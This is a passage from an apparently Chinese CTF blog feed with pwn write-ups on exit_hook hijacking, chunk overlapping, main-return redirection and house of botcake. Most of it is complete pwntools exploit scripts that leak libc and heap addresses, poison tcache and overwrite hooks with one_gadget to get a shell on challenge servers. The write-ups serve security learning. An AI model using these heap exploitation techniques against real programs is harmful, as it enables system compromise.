class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;cost: &#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">10</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0x4f29e</span>, <span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x10a2fc</span>]</span><br><span class="line">    og = og[<span class="number">2</span>] + libc_base</span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">1</span>,p64(og)) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/uaf/">uaf</category>
      
      <category domain="http://example.com/tags/chunk-extend/">chunk extend</category>
      
      <category domain="http://example.com/tags/chunk-overlapping/">chunk overlapping</category>
      
      
      <comments>http://example.com/2024/07/28/chunk-extend-overlapping/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>exit_hook劫持</title>
      <link>http://example.com/2024/07/26/exit-hook%E5%8A%AB%E6%8C%81/</link>
      <guid>http://example.com/2024/07/26/exit-hook%E5%8A%AB%E6%8C%81/</guid>
      <pubDate>Fri, 26 Jul 2024 09:02:34 GMT</pubDate>
      
      <description>&lt;p&gt;关于申请大于top chunk的堆块使其分配到libc的地址以及exit_hook的劫持&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于申请大于top chunk的堆块使其分配到libc的地址以及exit_hook的劫持</p><span id="more"></span><p>例题是 [CISCN 2022 初赛]newest_note</p><p>通过申请0x20004200大小的page，乘以8后为0x100021000，因为malloc的参数是int类型，故1被截断，0x21000比top chunk大，会在libc上分配一块新地址，从而利用整形溢出可泄露libc地址</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-1-17219872698651.png"></p><p>通过search命令可以找到libc中保存top chunk地址的地址</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-2.png"></p><p>再看我们堆块的地址，即可算出偏移 (0x7fe7a2f45ce0 - 0x7fe7a2d08010) &#x2F; 8 &#x3D; 293786</p><p>用0x7fe7a2f45ce0 泄露出的地址是0x7fe7a2f45cc0，因为程序show函数内是采用的是双指针类型</p><p>0x7fe7a2f45ce0 -&gt; 0x7fe7a2f45cd0 -&gt; 0x7fe7a2f45cc0</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-3.png"></p><p>uaf部分就不讲了，主要记录一下exit_hook是如何劫持的</p><p>这里主要是通过调试得出来的偏移</p><p>先在exit下个断点，然后单步调试到这里</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-4.png"></p><p>在libc文件中呈现为</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-5.png"></p><p>把偏移为0x21a6c8的地址赋值给rbx，偏移0x21a6D0的地址赋值给r12，这里rbx &lt; r12，所以会执行call qword ptr [rbx]，所以只需将 0x21a6c8 的值赋为 one_gadget 就可以了</p><p>这里需要注意的是，exit_hook的偏移不能直接用 0x21a6c8，要用 0x21a6c0，不然在申请堆块时会报错</p><p>malloc(): unaligned tcache chunk detected（检测到未对齐的tache块）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/newest_note&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b exit</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28866</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>(<span class="params"><span class="built_in">bytes</span>=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span> == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(r(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(r(<span class="built_in">bytes</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;will be? :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20004200</span>))</span><br><span class="line">    show(<span class="number">293786</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    libc_base = get_leak() - <span class="number">0x218cc0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    key = get_leak(<span class="number">5</span>)</span><br><span class="line">    heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">    lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    exit_hook = libc_base + <span class="number">0x21a6c0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i)</span><br><span class="line">    add(<span class="number">10</span>,p64(exit_hook^key))</span><br><span class="line">    add(<span class="number">11</span>)</span><br><span class="line">    add(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0xeeccc</span>, <span class="number">0xeeccf</span>, <span class="number">0xeecd2</span>]</span><br><span class="line">    og = og[<span class="number">0</span>] + libc_base</span><br><span class="line">    add(<span class="number">13</span>,p64(og)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/exit-hook/">exit_hook</category>
      
      <category domain="http://example.com/tags/top-chunk/">top chunk</category>
      
      <category domain="http://example.com/tags/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/">整型溢出</category>
      
      
      <comments>http://example.com/2024/07/26/exit-hook%E5%8A%AB%E6%8C%81/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>关于修改mian返回地址一个字节可重新执行main函数的原理</title>
      <link>http://example.com/2024/07/26/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86/</link>
      <guid>http://example.com/2024/07/26/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86/</guid>
      <pubDate>Fri, 26 Jul 2024 04:55:01 GMT</pubDate>
      
      <description>&lt;p&gt;关于修改mian返回地址一个字节可重新执行main函数的原理&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于修改mian返回地址一个字节可重新执行main函数的原理</p><span id="more"></span><p>例题是 [ImaginaryCTF 2024] fermat</p><p>main函数的返回地址并不是像其他被main函数调用的返回地址一样返回程序内的某个地址，而是返回__libc_start_main </p><p>如下</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-1.png"></p><p>然后在返回地址+0x10的地方保存着main函数的地址</p><p>在返回地址往上的低地址处存在着下面的这个函数，这个函数与__libc_start_main是挨着的，所以只需要修改__libc_start_main的一个字节即可劫持返回地址返回这个函数，关键的代码在于这个函数存在着这样一段汇编代码mov rax,[rsp+8];call rax</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-2.png"></p><p>因此，我们试着将其最后的一个字节修改为\x89</p><p>在ret之后，rsp+8,那么此时[rsp+8]就刚好指向main函数的地址</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-3.png"></p><p>mov rax,[rsp+8];call rax 之后，就能够返回main函数了</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-4.png"></p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/libc-start-main/">__libc_start_main</category>
      
      
      <comments>http://example.com/2024/07/26/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>house of botcake</title>
      <link>http://example.com/2024/07/17/house-of-botcake/</link>
      <guid>http://example.com/2024/07/17/house-of-botcake/</guid>
      <pubDate>Wed, 17 Jul 2024 12:16:27 GMT</pubDate>
      
      <description>&lt;p&gt;高版本glibc下的 tcache double free 之 house of botcake&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>高版本glibc下的 tcache double free 之 house of botcake</p><span id="more"></span><p>例题为[CISCN 2022 华东北]blue</p><p>glibc 版本是 Ubuntu GLIBC 2.31-0ubuntu9.8</p><h3 id="house-of-botcake原理"><a href="#house-of-botcake原理" class="headerlink" title="house of botcake原理"></a>house of botcake原理</h3><p>申请9个大于 fastbin 的堆块，即大于0x78，前七个堆块用于填充tcache，这里为了避免和top chunk合并申请了10个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment"># 0~9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)   <span class="comment"># 0~6</span></span><br></pre></td></tr></table></figure><p>第八个堆块作为prev，第九个堆块作为victim，释放victim，此时victim进入unsortbin，利用uaf可泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house%20of%20botcake-1.png"></p><p>释放prev与victim合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house%20of%20botcake-2.png"></p><p>申请一个tcache腾出空间，再释放victim使其进入tcache，此时victim就存在于tcache和unsortbin了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house%20of%20botcake-3.png"></p><p>然后我们只需再申请一个比 prev 大的堆块就可以修改到victim的指针了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span> + p64(addr)</span><br><span class="line">add(<span class="number">0x90</span>,pd)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>house of botcake后，劫持stdout去leak environ，最后 orw 就可以了，write换成puts是因为write的rop太长了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc.so.6&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1498)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28685</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):  <span class="comment"># only onces</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">idx</span>):   <span class="comment"># only onces</span></span><br><span class="line">    choice(<span class="number">666</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0x80</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    uaf(<span class="number">8</span>)  <span class="comment"># victim</span></span><br><span class="line">    show(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    environ = libc.sym[<span class="string">&quot;environ&quot;</span>] + libc_base</span><br><span class="line">    setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span> + libc_base</span><br><span class="line">    stdout = libc.sym[<span class="string">b&quot;_IO_2_1_stdout_&quot;</span>] + libc_base</span><br><span class="line">    lg(<span class="string">&#x27;stdout&#x27;</span>,stdout)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">7</span>) <span class="comment"># prev</span></span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>) <span 